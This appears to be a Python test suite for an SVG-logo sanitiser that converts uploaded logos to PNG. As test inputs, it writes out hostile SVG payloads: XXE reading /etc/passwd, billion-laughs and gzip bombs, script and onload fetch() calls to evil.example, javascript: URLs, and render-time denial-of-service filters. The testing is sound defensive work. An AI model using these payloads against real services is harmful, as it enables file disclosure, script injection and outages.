"""SVG logos, rasterised safely (services/svg_logo.py, services/brand_logo.py; docs/design-dna.md).

A legitimate SVG logo becomes a same-origin PNG copy, read like any PNG logo. Hostile SVGs
are refused or neutralised before the renderer sees them, and the renderer runs in a child
process with a timeout. Nothing here touches the network: the logo download goes to an
httpx.MockTransport behind fake DNS, the DNA model is a stand-in, and the one socket opened
is a local listener that proves the renderer never connects anywhere.
"""
import _test_env  # noqa: F401  (must come before any `app` import)

import base64
import gzip
import io
import json
import socket
import time
import unittest
from unittest import mock

from PIL import Image

from _dna_fixtures import DnaTestCase, FakeDnaModel
from app.config import get_settings
from app.services import brand_logo, design_dna, svg_logo
from app.services.jsonutil import dumps
from test_design_dna_v2 import FakeWeb, set_logo_url

NS = 'xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"'
SVG_URL = "https://shop.example/media/logo.svg"


def mark_svg(fill: str = "#c2185b") -> bytes:
    """A logo as Illustrator writes it: an XML declaration, a DOCTYPE line, a class in a
    <style>, metadata, and a <switch> whose first branch is a foreignObject for Illustrator.
    The mark sits on the pixel grid at 2048 px (400 units -> 5.12 px each) with transparent
    margins, so its colour has no anti-aliased edge."""
    return f'''<?xml version="1.0" encoding="utf-8"?>
<!-- Generator: Adobe Illustrator 27.0.0, SVG Export Plug-In -->
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" id="Layer_1" {NS} xmlns:i="http://ns.adobe.com/AdobeIllustrator/10.0/"
     x="0px" y="0px" viewBox="0 0 400 200" xml:space="preserve">
<style type="text/css">.st0{{fill:{fill};}}</style>
<metadata><i:pgfRef xlink:href="#adobe_illustrator_pgf"/></metadata>
<switch>
  <foreignObject requiredExtensions="http://ns.adobe.com/AdobeIllustrator/10.0/" x="0" y="0" width="1" height="1"/>
  <g i:extraneous="self"><rect x="100" y="50" class="st0" width="200" height="100"/></g>
</switch>
</svg>'''.encode()


def png_pixels(png: bytes):
    image = Image.open(io.BytesIO(png))
    image.load()
    return image


def green_png(size=(8, 8)) -> bytes:
    out = io.BytesIO()
    Image.new("RGBA", size, (0, 255, 0, 255)).save(out, format="PNG")
    return out.getvalue()


def is_green(pixel) -> bool:
    r, g, b, a = pixel
    return g > 200 and r < 60 and b < 60 and a > 0


# --- the sanitiser and the renderer ----------------------------------------------------------------


class SanitiseTest(unittest.TestCase):
    def assertRejected(self, data: bytes, *reasons: str, within: float = 2.0) -> str:
        started = time.monotonic()
        with self.assertRaises(svg_logo.SvgRejected) as caught:
            svg_logo.rasterise(data)
        self.assertLess(time.monotonic() - started, within, "refused before any long work")
        if reasons:
            self.assertIn(caught.exception.reason, reasons)
        return caught.exception.reason

    def test_a_normal_svg_logo_becomes_a_png(self):
        png = svg_logo.rasterise(mark_svg())
        image = png_pixels(png)
        self.assertEqual(image.format, "PNG")
        self.assertEqual(image.mode, "RGBA")
        self.assertEqual(image.size, (2048, 1024), "fitted to the 2048 px box, aspect kept")
        self.assertEqual(image.getpixel((1024, 512)), (194, 24, 91, 255), "the <style> class fill")
        self.assertEqual(image.getpixel((10, 10))[3], 0, "the margins stay transparent")

    def test_the_plain_doctype_and_illustrator_extras_are_dropped(self):
        clean = svg_logo.sanitise(mark_svg())
        self.assertNotIn("DOCTYPE", clean.svg)
        self.assertNotIn("foreignObject", clean.svg)
        self.assertNotIn("metadata", clean.svg)
        self.assertNotIn("AdobeIllustrator", clean.svg)
        self.assertIn("<switch>", clean.svg)
        self.assertFalse(clean.has_text)

    def test_billion_laughs_is_refused_without_expanding(self):
        lol = b'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY lol "lol">' + b"".join(
            b'<!ENTITY lol%d "%s">' % (i, (b"&lol%d;" % (i - 1) if i > 1 else b"&lol;") * 10) for i in range(1, 10)
        ) + b']><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><text>&lol9;</text></svg>'
        self.assertRejected(lol, "dtd", "entities")

    def test_external_entities_and_dtds_are_refused(self):
        xxe = (b'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
               b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><text>&xxe;</text></svg>')
        self.assertRejected(xxe, "dtd", "entities")
        remote_dtd = (b'<!DOCTYPE svg SYSTEM "http://evil.example/x.dtd" [<!ELEMENT svg ANY>]>'
                      b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"/>')
        self.assertRejected(remote_dtd, "dtd")

    def test_external_hrefs_are_stripped_and_nothing_local_is_read(self):
        import shutil
        import tempfile
        from pathlib import Path

        # resvg itself would read a local image named by an href: none may reach it.
        folder = Path(tempfile.mkdtemp(prefix="svg-href-"))
        self.addCleanup(shutil.rmtree, folder, True)
        (folder / "secret.png").write_bytes(green_png())
        path = str(folder / "secret.png")
        for href in (path, f"file://{path}", "secret.png", "http://evil.example/logo.png",
                     "https://evil.example/logo.png", "//evil.example/logo.png", "javascript:alert(1)",
                     "data:image/svg+xml;base64," + base64.b64encode(b"<svg/>").decode()):
            with self.subTest(href=href[:40]):
                svg = (f'<svg {NS} viewBox="0 0 80 40"><rect width="40" height="40" fill="#123456"/>'
                       f'<image x="40" width="40" height="40" xlink:href="{href}"/>'
                       f'<image x="40" width="40" height="40" href="{href}"/>'
                       f'<use xlink:href="{href}#a"/><feImage href="{href}"/></svg>').encode()
                clean = svg_logo.sanitise(svg)
                self.assertNotIn(href, clean.svg)
                self.assertNotIn("<image", clean.svg, "an image with no safe source is dropped")
                self.assertNotIn("<use", clean.svg)
                image = png_pixels(svg_logo.render(clean.svg, fonts=False))
                self.assertEqual(image.getpixel((1536, 512))[3], 0, "nothing was drawn where the image was")

    def test_url_references_keep_only_fragments(self):
        svg = (f'<svg {NS} viewBox="0 0 10 10"><style>@import url(http://evil.example/a.css);'
               '@font-face{font-family:x;src:url(https://evil.example/f.woff)} .a{fill:url("http://evil.example/p.svg#p")}'
               '.b{fill:url(#g)}</style><linearGradient id="g"><stop stop-color="#c2185b"/></linearGradient>'
               '<rect class="b" width="10" height="10" style="filter:url(file:///etc/x.svg#f)" '
               'mask="url(http://evil.example/m.svg#m)" fill="url(\'#g\')"/></svg>').encode()
        clean = svg_logo.sanitise(svg)
        self.assertNotIn("evil.example", clean.svg)
        self.assertNotIn("file:", clean.svg)
        self.assertNotIn("@import", clean.svg)
        self.assertNotIn("@font-face", clean.svg)
        self.assertIn(".b{fill:url(#g)}", clean.svg)
        self.assertIn('fill="url(#g)"', clean.svg)
        escaped = f'<svg {NS} viewBox="0 0 10 10"><style>.a{{fill:u\\72l(http://evil.example/x)}}</style></svg>'
        including = (f'<?xml-stylesheet type="text/css" href="http://evil.example/x.css"?><svg {NS} viewBox="0 0 10 10">'
                     '<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="file:///etc/passwd" parse="text"/>'
                     '<rect width="1" height="1"/></svg>')
        clean = svg_logo.sanitise(including.encode()).svg
        self.assertNotIn("evil", clean, "processing instructions are not kept")
        self.assertNotIn("include", clean, "XInclude is another namespace: dropped, never processed")
        self.assertNotIn("evil", svg_logo.sanitise(escaped.encode()).svg, "CSS with escapes is dropped")

    def test_the_renderer_itself_never_opens_a_connection(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.addCleanup(server.close)
        server.bind(("127.0.0.1", 0))
        server.listen(8)
        server.setblocking(False)
        port = server.getsockname()[1]
        base = f"http://127.0.0.1:{port}"
        svg = (f'<svg {NS} viewBox="0 0 20 10"><style>@import url({base}/a.css);</style>'
               f'<image width="10" height="10" xlink:href="{base}/x.png"/>'
               f'<rect x="10" width="10" height="10" fill="url({base}/p.svg#p)" stroke="#c2185b"/></svg>')
        # Unsanitised, straight to the renderer: resvg has no network client.
        svg_logo.render(svg, fonts=False)
        # And through the whole path.
        svg_logo.rasterise(svg.encode())
        with self.assertRaises(BlockingIOError, msg="no connection reached the listener"):
            server.accept()

    def test_script_event_handlers_and_foreign_object_are_removed(self):
        svg = (f'<svg {NS} viewBox="0 0 20 10" onload="fetch(\'https://evil.example\')">'
               '<script>alert(1)</script><script xlink:href="https://evil.example/x.js"/>'
               '<foreignObject width="20" height="10"><html xmlns="http://www.w3.org/1999/xhtml">'
               '<body><iframe src="https://evil.example"/><img src="x" onerror="alert(1)"/></body></html>'
               '</foreignObject>'
               '<a xlink:href="javascript:alert(1)"><rect width="10" height="10" fill="#c2185b" '
               'onclick="alert(1)" onmouseover="alert(1)"/></a>'
               '<set attributeName="fill" to="url(https://evil.example/x)"/>'
               '<animate attributeName="href" values="javascript:alert(1)"/>'
               '<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script></svg>').encode()
        clean = svg_logo.sanitise(svg)
        for word in ("script", "onload", "onclick", "onmouseover", "onerror", "foreignObject", "iframe",
                     "javascript", "evil", "<set", "<animate", "<html", "<body"):
            self.assertNotIn(word, clean.svg)
        self.assertIn('fill="#c2185b"', clean.svg, "the drawing itself stays")
        image = png_pixels(svg_logo.render(clean.svg, fonts=False))
        self.assertEqual(image.getpixel((500, 500)), (194, 24, 91, 255))

    def test_huge_or_nonsense_dimensions_are_refused(self):
        for attrs in ('width="100000000" height="100000000"', 'viewBox="0 0 1e9 1e9"', 'viewBox="0 0 0 10"',
                      'viewBox="0 0 -5 10"', 'viewBox="0 0 nan 10"', 'viewBox="0 0 inf 10"',
                      'width="-10" height="10"', 'viewBox="0 0 10000 1"', 'width="12furlongs" height="3"',
                      'viewBox="0 0 10"'):
            with self.subTest(attrs=attrs):
                self.assertRejected(f'<svg {NS} {attrs}><rect width="1" height="1"/></svg>'.encode(), "bad_size")

    def test_physical_units_and_no_namespace_still_render(self):
        for svg in (f'<svg {NS} width="10cm" height="5cm"><rect width="100%" height="100%" fill="#c2185b"/></svg>',
                    '<svg viewBox="0 0 100 50"><rect width="100" height="50" fill="#c2185b"/></svg>'):
            with self.subTest(svg=svg[:40]):
                self.assertEqual(png_pixels(svg_logo.rasterise(svg.encode())).size, (2048, 1024))

    def test_deep_nesting_is_refused_without_recursion(self):
        shallow = f'<svg {NS} viewBox="0 0 10 10">' + "<g>" * 45 + '<rect width="1" height="1"/>' + "</g>" * 45 + "</svg>"
        self.assertRejected(shallow.encode(), "too_deep")
        deep = f'<svg {NS} viewBox="0 0 10 10">' + "<g>" * 60_000 + "</g>" * 60_000 + "</svg>"
        self.assertLess(len(deep), svg_logo.MAX_SVG_BYTES)
        self.assertRejected(deep.encode(), "too_deep")

    def test_too_many_elements_is_refused(self):
        many = f'<svg {NS} viewBox="0 0 10 10">' + '<rect width="1" height="1"/>' * 5_001 + "</svg>"
        self.assertRejected(many.encode(), "too_many_elements")

    def test_a_use_bomb_and_reference_cycles_are_refused(self):
        parts = [f'<svg {NS} viewBox="0 0 10 10"><defs><rect id="a0" width="1" height="1"/>']
        for level in range(1, 10):
            parts.append(f'<g id="a{level}">' + f'<use xlink:href="#a{level - 1}"/>' * 10 + "</g>")
        parts.append('</defs><use xlink:href="#a9"/></svg>')
        bomb = "".join(parts).encode()
        self.assertLess(len(bomb), 4_000, "a billion rectangles from under 4 KB")
        self.assertRejected(bomb, "too_many_drawn")
        cycle = (f'<svg {NS} viewBox="0 0 10 10"><g id="a"><use xlink:href="#b"/></g>'
                 '<g id="b"><use xlink:href="#a"/></g></svg>').encode()
        self.assertRejected(cycle, "reference_cycle")
        pattern = (f'<svg {NS} viewBox="0 0 10 10"><pattern id="p" width="1" height="1">'
                   '<rect width="1" height="1" fill="url(#p)"/></pattern><rect width="10" height="10" fill="url(#p)"/></svg>')
        self.assertRejected(pattern.encode(), "reference_cycle")

    def test_a_gzip_bomb_stops_at_the_cap(self):
        bomb = gzip.compress(f'<svg {NS} viewBox="0 0 10 10">'.encode() + b" " * 50_000_000 + b"</svg>")
        self.assertLess(len(bomb), 100_000)
        with mock.patch.object(svg_logo.zlib, "decompressobj", wraps=svg_logo.zlib.decompressobj) as inflate:
            self.assertRejected(bomb, "too_large")
        inflate.assert_called_once()
        # A small, honest .svgz still renders.
        self.assertEqual(png_pixels(svg_logo.rasterise(gzip.compress(mark_svg()))).size, (2048, 1024))
        # And an oversized plain file is refused before parsing.
        self.assertRejected(b"<svg>" + b" " * svg_logo.MAX_SVG_BYTES + b"</svg>", "too_large")

    def test_an_svg_that_renders_too_long_is_killed_at_the_timeout(self):
        # Two hundred octaves of turbulence over a 2048 px box: minutes of CPU from 300 bytes.
        slow = (f'<svg {NS} viewBox="0 0 100 100"><filter id="t" x="0" y="0" width="1" height="1">'
                '<feTurbulence baseFrequency="0.9" numOctaves="200"/></filter>'
                '<rect width="100" height="100" filter="url(#t)"/></svg>').encode()
        started = time.monotonic()
        with self.assertRaises(svg_logo.SvgRejected) as caught:
            svg_logo.rasterise(slow, timeout=1.0)
        self.assertEqual(caught.exception.reason, "timeout")
        self.assertLess(time.monotonic() - started, 5.0)

    def test_embedded_raster_images_are_checked(self):
        good = base64.b64encode(green_png()).decode()
        svg = f'<svg {NS} viewBox="0 0 8 8"><image width="8" height="8" xlink:href="data:image/png;base64,{good}"/></svg>'
        self.assertTrue(is_green(png_pixels(svg_logo.rasterise(svg.encode())).getpixel((1024, 1024))),
                        "an inline PNG is kept")
        bad = {
            "declared jpeg, really png": f"data:image/jpeg;base64,{good}",
            "an inline svg": "data:image/svg+xml;base64," + base64.b64encode(b"<svg/>").decode(),
            "not base64": "data:image/png;base64,@@@@",
            "a pixel bomb": "data:image/png;base64," + base64.b64encode(self._png_header(60_000, 60_000)).decode(),
        }
        for label, href in bad.items():
            with self.subTest(label):
                clean = svg_logo.sanitise(
                    f'<svg {NS} viewBox="0 0 8 8"><rect width="1" height="1"/><image width="8" height="8" xlink:href="{href}"/></svg>'.encode())
                self.assertNotIn("<image", clean.svg)

    @staticmethod
    def _png_header(width: int, height: int) -> bytes:
        import struct
        import zlib

        def chunk(tag: bytes, payload: bytes) -> bytes:
            body = tag + payload
            return struct.pack(">I", len(payload)) + body + struct.pack(">I", zlib.crc32(body) & 0xFFFFFFFF)

        return (b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", width, height, 8, 6, 0, 0, 0))
                + chunk(b"IDAT", zlib.compress(b"\x00" * 64)) + chunk(b"IEND", b""))

    def test_not_svg_at_all(self):
        for data in (b"<html><body>hi</body></html>", b"not xml", b"\x89PNG\r\n\x1a\n" + b"0" * 200,
                     b"\x1f\x8b" + b"broken gzip"):
            with self.subTest(data=data[:12]):
                self.assertRejected(data, "not_svg")

    def test_a_text_logo_gets_the_system_fonts(self):
        svg = f'<svg {NS} viewBox="0 0 300 60"><text x="10" y="45" font-size="40" fill="#1f4e9c">שלום Logo</text></svg>'
        clean = svg_logo.sanitise(svg.encode())
        self.assertTrue(clean.has_text)
        image = png_pixels(svg_logo.render(clean.svg, fonts=True))
        self.assertIsNotNone(image.getchannel("A").getbbox(), "the words were drawn")

    def test_a_missing_or_failing_renderer_is_a_reason_not_a_crash(self):
        clean = svg_logo.sanitise(mark_svg())
        failed = mock.Mock(returncode=3, stdout=b"")
        with mock.patch.object(svg_logo.subprocess, "run", return_value=failed):
            with self.assertRaises(svg_logo.SvgRejected) as caught:
                svg_logo.render(clean.svg, fonts=False)
        self.assertEqual(caught.exception.reason, "renderer_missing")
        with mock.patch.object(svg_logo.subprocess, "run", return_value=mock.Mock(returncode=0, stdout=b"<svg/>")):
            with self.assertRaises(svg_logo.SvgRejected) as caught:
                svg_logo.render(clean.svg, fonts=False)
        self.assertEqual(caught.exception.reason, "render_failed", "only PNG bytes come back")

    def test_the_child_runs_with_an_empty_environment(self):
        clean = svg_logo.sanitise(mark_svg())
        with mock.patch.object(svg_logo.subprocess, "run", wraps=svg_logo.subprocess.run) as run:
            svg_logo.render(clean.svg, fonts=False)
        kwargs = run.call_args.kwargs
        self.assertEqual(kwargs["env"], {}, "no secret reaches the process that parses customer input")
        self.assertEqual(kwargs["timeout"], svg_logo.RENDER_TIMEOUT_SECONDS)
        self.assertIn("-I", run.call_args.args[0], "isolated mode: no PYTHON* variables, no user site")


# --- through the logo copy and the DNA -------------------------------------------------------------


class SvgLogoCopyTest(DnaTestCase, unittest.TestCase):
    def setUp(self):
        self.setUp_dna()
        self.business = self.add_business("תחרה", field="fashion", offerings="הלבשה תחתונה")
        set_logo_url(self.business, SVG_URL)
        self.db.commit()

    def logo_files(self, business=None) -> list:
        folder = self.media / str((business or self.business).id)
        return [p for p in folder.glob("logo-*")] if folder.exists() else []

    def test_an_svg_logo_becomes_a_same_origin_png_with_its_own_reading(self):
        web = FakeWeb({SVG_URL: (200, "image/svg+xml", mark_svg())})
        web.start(self)
        record = brand_logo.ensure(self.business)
        self.db.commit()
        self.assertEqual(record["status"], "ok")
        self.assertEqual(record["format"], "svg")
        self.assertTrue(record["public_url"].startswith(f"/backend/media/{self.business.id}/logo-"))
        self.assertTrue(record["filename"].endswith(".png"))
        stored = (self.media / str(self.business.id) / record["filename"]).read_bytes()
        self.assertNotIn(b"<svg", stored, "the SVG itself is never stored")
        with Image.open(io.BytesIO(stored)) as image:
            self.assertEqual((image.format, image.mode), ("PNG", "RGBA"))
            self.assertEqual(image.size, (1024, 512), "rendered at 2048, trimmed to the mark, ≤ 1024")
            self.assertEqual(image.getchannel("A").getextrema(), (255, 255), "transparent margins trimmed")
        self.assertEqual((record["width"], record["height"]), (1024, 512))
        self.assertTrue(record["has_alpha"])
        self.assertEqual(record["logo_on"], "any")
        self.assertEqual([c["hex"] for c in record["colors"]], ["#c2185b"])
        self.assertEqual(web.requests, [SVG_URL], "one request: the logo, and nothing it names")
        # The DNA signs with it, and its model is shown the PNG.
        model = FakeDnaModel()
        with mock.patch.object(design_dna, "_ask_model", side_effect=model), \
                mock.patch.object(get_settings(), "design_dna_on_scan", True):
            design_dna.refresh_after_scan(self.engine, self.business.id)
        self.db.refresh(self.business)
        dna = design_dna.load_dna(self.business)
        self.assertIn(dna["signature"]["kind"], ("corner_mark", "footer_band", "none"))
        self.assertEqual(dna["signature"]["logo_url"], record["public_url"])
        self.assertEqual(model.calls[0]["images"][0][1], "image/png")
        self.assertIn("#c2185b (logo", model.calls[0]["prompt"])

    def test_logo_on_comes_from_the_rendered_pixels(self):
        cases = {"light": "#28201e", "dark": "#faf8f0", "any": "#ce1126"}
        for expected, fill in cases.items():
            with self.subTest(expected=expected):
                png = svg_logo.rasterise(mark_svg(fill))
                _png, reading = brand_logo.normalise(png, "image/png")
                self.assertEqual(reading["logo_on"], expected)
                self.assertEqual(reading["colors"][0]["hex"], fill)

    def test_the_owner_alone_is_served_the_png(self):
        FakeWeb({SVG_URL: (200, "image/svg+xml", mark_svg())}).start(self)
        record = brand_logo.ensure(self.business)
        self.db.commit()
        from app import main as app_main

        with mock.patch.object(app_main, "MEDIA_DIR", self.media):
            response = self.client_for(self.business).get(f"/media/{self.business.id}/{record['filename']}")
            self.assertEqual(response.status_code, 200)
            self.assertEqual(response.headers["content-type"], "image/png")
            stranger = self.client_for(self.add_business("אחר"))
            self.assertEqual(stranger.get(f"/media/{self.business.id}/{record['filename']}").status_code, 404)

    def test_hostile_svgs_fall_back_to_the_name(self):
        hostile = {
            "entities": b'<!DOCTYPE svg [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;">]>'
                        b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><path fill="#c2185b" d="M0 0h10v10z"/>'
                        b'<text>&b;</text></svg>',
            "script only": f'<svg {NS} viewBox="0 0 10 10"><script>alert(1)</script>'
                           '<foreignObject><div xmlns="http://www.w3.org/1999/xhtml">x</div></foreignObject>'
                           '<image width="10" height="10" xlink:href="https://evil.example/x.png"/></svg>'.encode(),
            "huge": f'<svg {NS} width="1e12" height="1e12"><rect width="1" height="1" fill="#c2185b"/></svg>'.encode(),
        }
        expected_reason = {"entities": "dtd", "script only": "blank", "huge": "bad_size"}
        urls = {label: f"https://shop.example/media/logo-{index}.svg" for index, label in enumerate(hostile)}
        web = FakeWeb({urls[label]: (200, "image/svg+xml", svg + b" " * 200) for label, svg in hostile.items()})
        web.start(self)
        for label in hostile:
            with self.subTest(label):
                business = self.add_business(f"עסק {label}", field="fashion", palette=[])
                set_logo_url(business, urls[label])
                web.requests.clear()
                record = brand_logo.ensure(business)
                self.assertEqual(record["status"], "unsupported")
                self.assertEqual(record["reason"], expected_reason[label])
                self.assertNotIn("public_url", record)
                self.assertEqual(self.logo_files(business), [])
                self.assertEqual(web.requests, [urls[label]], "nothing the SVG names is fetched")
                signature = design_dna.preview_dna(business)["signature"]
                self.assertIn(signature["kind"], ("name_only", "none"), "the name, never a monogram")
                self.assertEqual((signature["logo_url"], signature["use_logo"]), ("", False))

    def test_when_rasterisation_fails_the_name_signs_and_the_colours_still_count(self):
        svg = (b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><path fill="#c2185b" d="M0 0h10v10z"/>'
               b'<path fill="#c2185b" d="M1 1h2v2z"/></svg>')
        FakeWeb({SVG_URL: (200, "image/svg+xml", svg + b" " * 200)}).start(self)
        for failure, reason in ((svg_logo.SvgRejected("timeout"), "timeout"),
                                (RuntimeError("renderer crashed"), "render_failed")):
            with self.subTest(reason=reason):
                with mock.patch.object(svg_logo, "render", side_effect=failure), \
                        mock.patch.object(brand_logo.log, "exception") as logged:
                    record = brand_logo.ensure(self.business, force=True)
                self.assertEqual(logged.called, isinstance(failure, RuntimeError), "only the unexpected is logged")
                self.assertEqual((record["status"], record["format"], record["reason"]), ("unsupported", "svg", reason))
                self.assertEqual(self.logo_files(), [])
                signals = design_dna.signals_for(self.db, self.business)
                self.assertEqual((signals["swatches"][0].hex, signals["swatches"][0].source), ("#c2185b", "logo"))
                self.assertFalse(signals["has_logo"])
                self.assertEqual(design_dna.preview_dna(self.business)["signature"]["kind"], "name_only")

    def test_a_refused_svg_waits_but_one_from_before_rasterising_is_tried_now(self):
        web = FakeWeb({SVG_URL: (200, "image/svg+xml", mark_svg())})
        web.start(self)
        now = brand_logo._now()
        self.business.brand_logo_json = dumps({"source_url": SVG_URL, "status": "unsupported", "format": "svg",
                                               "reason": "timeout", "checked_at": now})
        self.assertEqual(brand_logo.ensure(self.business)["status"], "unsupported")
        self.assertEqual(web.requests, [], "a recent refusal is not retried on every refresh")
        self.business.brand_logo_json = dumps({"source_url": SVG_URL, "status": "unsupported", "format": "svg",
                                               "colors": [{"hex": "#c2185b", "share": 1.0}], "checked_at": now})
        self.assertEqual(brand_logo.ensure(self.business)["status"], "ok")
        self.assertEqual(web.requests, [SVG_URL])
        self.assertEqual(json.loads(self.business.brand_logo_json)["format"], "svg")


if __name__ == "__main__":
    unittest.main()
